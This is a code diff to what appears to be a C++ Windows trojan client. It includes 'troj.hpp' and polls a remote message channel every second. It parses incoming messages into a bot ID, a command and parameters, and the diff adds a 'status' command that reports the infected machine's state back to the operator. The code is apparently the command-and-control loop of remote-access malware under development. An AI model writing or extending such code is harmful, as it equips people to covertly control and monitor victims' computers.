@@ -3,6 +3,7 @@
 #include <fstream>
 #include <windows.h>
 #include <time.h>
+#include <sstream>
 #include "troj.hpp"
 #include <cpr/cpr.h>
 #include <nlohmann/json.hpp>
@@ -14,6 +15,8 @@ constexpr int REFRESH = 1; //in seconds
 
 int main() {
 
+    uptime_start = time(nullptr);
+
 	fstream file;
 	file.open("ID.id");
 	file >> ID;
@@ -24,7 +27,7 @@ int main() {
 	while (true) {
 		Sleep(REFRESH * 1000);
 		json message = GetLastMessage();
-		
+
 		int last;
 		file.open("last", ios::in);
 		file >> last;
@@ -41,23 +44,25 @@ int main() {
 		
 		string id="", command="" ,parameters="";
 		string parse = message["text"];
-		for (int i = 0; i < parse.size(); i++)
+		for (int i = 0, it = 0; i < parse.size(); i++)
 		{
-			int it = 1;
 			if (parse[i] == ' ') {
 				it++; continue;
 			}
 
-			if (it == 1)id += parse[i];
-			if (it == 2)command += parse[i];
-			if (it > 2)parameters += parse[i];
-
+			if (it == 0)id += parse[i];
+			if (it == 1)command += parse[i];
+			if (it > 1)parameters += parse[i];
 
 		}
 		if (id.empty() || command.empty()) continue;
 		
-		if (ID == id) {
-			//...
+		if (ID == id) { //I used json cause propably in developing dupnix i will use it
+			if (command == "status") { 
+				string s; stringstream ss;
+				ss << getStatus(); ss >> s;
+				Send(s);
+			}
 		}
 	}
 }
